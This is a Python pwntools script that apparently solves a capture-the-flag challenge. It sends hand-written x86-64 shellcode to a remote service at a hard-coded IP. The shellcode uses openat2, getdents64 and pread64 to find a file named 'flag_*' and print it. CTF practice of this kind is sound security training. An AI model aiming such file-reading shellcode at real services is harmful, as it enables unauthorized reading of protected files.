#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

shellcode = asm(r"""
    endbr64
    sub rsp, 0x1800

    /* openat2(AT_FDCWD, ".", { O_DIRECTORY, 0, 0 }, 24) */
    mov byte ptr [rsp], 0x2e
    mov byte ptr [rsp+1], 0
    mov qword ptr [rsp+0x10], 0x10000
    mov qword ptr [rsp+0x18], 0
    mov qword ptr [rsp+0x20], 0
    mov eax, 437
    mov edi, -100
    lea rsi, [rsp]
    lea rdx, [rsp+0x10]
    mov r10d, 24
    syscall
    mov r12d, eax

    /* getdents64(dirfd, entries, 0x1000) */
    mov eax, 217
    mov edi, r12d
    lea rsi, [rsp+0x100]
    mov edx, 0x1000
    syscall
    xor r14d, r14d

next_entry:
    lea rbx, [rsp+r14+0x100]
    lea rsi, [rbx+19]
    cmp dword ptr [rsi], 0x67616c66
    jne advance
    cmp byte ptr [rsi+4], 0x5f
    je found

advance:
    movzx eax, word ptr [rbx+16]
    add r14, rax
    jmp next_entry

found:
    /* openat2(dirfd, d_name, { O_RDONLY, 0, 0 }, 24) */
    mov qword ptr [rsp+0x10], 0
    mov qword ptr [rsp+0x18], 0
    mov qword ptr [rsp+0x20], 0
    mov eax, 437
    mov edi, r12d
    lea rdx, [rsp+0x10]
    mov r10d, 24
    syscall

    /* pread64(flagfd, output, 0x400, 0) */
    mov edi, eax
    mov eax, 17
    lea rsi, [rsp+0x1200]
    mov edx, 0x400
    xor r10d, r10d
    syscall

    /* write(1, output, bytes_read) */
    mov edx, eax
    mov eax, 1
    mov edi, 1
    lea rsi, [rsp+0x1200]
    syscall

    mov eax, 60
    xor edi, edi
    syscall
""")

io = remote("64.23.142.12", 1337)
io.recvuntil(b"shellcode> ")
io.send(shellcode)
print(io.recvall().decode(), end="")
